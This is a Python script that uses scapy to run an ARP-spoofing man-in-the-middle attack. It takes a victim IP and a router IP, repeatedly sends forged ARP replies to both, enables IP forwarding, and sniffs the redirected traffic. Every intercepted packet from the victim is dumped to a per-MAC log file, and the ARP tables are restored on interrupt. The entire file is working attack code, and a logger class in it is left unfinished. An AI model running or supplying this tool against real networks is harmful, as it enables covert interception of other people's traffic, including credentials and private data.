#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # supress warnins
from scapy.all import * # then import
logging.getLogger("scapy.runtime").setLevel(1) # then restore them
import argparse
import signal
import time
import sys
from contextlib import contextmanager
import threading

def myExit(status):
    print " > HDM exit"
    exit(status)

def parse_args():
    help_message = "Usage: ./hdm.py -v V -r R [-h]\n where :\n V is victim IP\n R is router IP"
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-v", "--victimIP")
    parser.add_argument("-r", "--routerIP")
    parser.add_argument("-h", "--help", action="store_true")
    if parser.parse_args().help:
        print help_message
        exit(0)
    if not parser.parse_args().victimIP:
        print " > victim IP not specified | use -h for more info"
        exit(0)
    if not parser.parse_args().routerIP:
        print " > router IP not specified | use -h for more info"
        exit(0)
    return parser.parse_args()

def originalMAC(ip):
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
    for s,r in ans:
        return r.sprintf("%Ether.src%")

@contextmanager
def stdout_redirected(new_stdout):
    save_stdout = sys.stdout
    sys.stdout = new_stdout
    try:
        yield None
    finally:
        sys.stdout = save_stdout

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)

def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=0)
    print ""
    print " > network defaults restored"
    myExit(0)

def test(pkt):
    print pkt.summary()
    # data = [method for method in dir(pkt) if callable(getattr(pkt, method))]
    # for call in data:
    #     print call
    # pkt.show()
    mac = pkt.sprintf("%Ether.src%")
    fileName = "./logs/" + mac.replace(':', '_')
    logFile = open(fileName, 'a+')
    logFile.write(''.join(("  ", time.strftime("%H:%M:%S"), "  ", time.strftime("%d/%m/%Y"))))
    logFile.write('\n')
    with stdout_redirected(logFile):
        pkt.show()
    logFile.write('\n')
    logFile.close()

class Logger(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.run = False

    def parsePacket(self, pkt):
        print "WTF"

    def stop(self):
        self.run = False

    def start(self):
        while self.run:
            sniff(prn=self.parsePacket, store=0) # neznau kak v prn poslat clasovuu funktsiu

def main(args):
    print " > HDM start"
    if os.geteuid() != 0:
        print("[!] Please run as root")
        myExit(0)
    routerIP = args.routerIP
    victimIP = args.victimIP
    print "routerIP:", routerIP
    print "victimIP:", victimIP
    routerMAC = originalMAC(args.routerIP)
    victimMAC = originalMAC(args.victimIP)
    print "routerMAC:", routerMAC
    print "victimMAC:", victimMAC
    if routerMAC == None:
        print "Could not find router MAC address."
        myExit(0)
    if victimMAC == None:
        print "Could not find victim MAC address."
        myExit(0)
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')
    def signal_handler(signal, frame):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('0\n')
        restore(routerIP, victimIP, routerMAC, victimMAC)
    signal.signal(signal.SIGINT, signal_handler)

    # log = Logger() #not working yet
    print " > poisoning in progress"
    while 1:
        poison(routerIP, victimIP, routerMAC, victimMAC)
        time.sleep(1.5)
        sniff(prn=test, store=0) # logger 
main(parse_args())
